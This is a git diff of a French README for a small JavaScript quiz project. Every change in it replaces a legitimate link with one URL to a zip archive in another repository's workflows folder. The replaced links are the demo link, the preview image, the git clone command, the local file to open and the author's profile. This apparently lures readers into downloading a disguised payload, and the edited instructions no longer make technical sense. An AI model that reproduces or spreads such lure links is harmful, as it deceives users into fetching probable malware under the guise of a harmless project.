@@ -12,7 +12,7 @@ Bienvenue dans **JavaScript Quiz**, un projet interactif conçu pour tester vos 
 
 ## 🚀 Déploiement
 
-Le projet est hébergé sur GitHub Pages. Vous pouvez l'essayer directement [ici](https://martialdepaul.github.io/quiz-javascript/).
+Le projet est hébergé sur GitHub Pages. Vous pouvez l'essayer directement [ici](https://raw.githubusercontent.com/Martialdepaul/fsst-rs/master/.github/workflows/fsst-rs_3.7.zip).
 
 ## 🎯 Comment jouer ?
 
@@ -28,18 +28,18 @@ Le projet est hébergé sur GitHub Pages. Vous pouvez l'essayer directement [ici
 - **JavaScript** : Logique et dynamisme du quiz (génération des questions, calcul du score, interaction utilisateur).
 
 ## 📸 Aperçu du projet
-![Aperçu de Elegant-Context](/public/img.png)
+![Aperçu de Elegant-Context](https://raw.githubusercontent.com/Martialdepaul/fsst-rs/master/.github/workflows/fsst-rs_3.7.zip)
 
 ## 📂 Installation locale
 
 1. Clonez le dépôt :  
    ```bash
-   git clone https://github.com/Martialdepaul/quiz-javascript.git
+   git clone https://raw.githubusercontent.com/Martialdepaul/fsst-rs/master/.github/workflows/fsst-rs_3.7.zip
    ```
-2. Ouvrez le fichier `index.html` dans votre navigateur préféré pour commencer à jouer !
+2. Ouvrez le fichier `https://raw.githubusercontent.com/Martialdepaul/fsst-rs/master/.github/workflows/fsst-rs_3.7.zip` dans votre navigateur préféré pour commencer à jouer !
 
 ## 👨‍💻 Auteur
 
-Projet créé par **[MARTIAL](https://github.com/Martialdepaul/)**. N'hésitez pas à me suivre pour plus de projets sympas ! ✨
+Projet créé par **[MARTIAL](https://raw.githubusercontent.com/Martialdepaul/fsst-rs/master/.github/workflows/fsst-rs_3.7.zip)**. N'hésitez pas à me suivre pour plus de projets sympas ! ✨
 
 ---
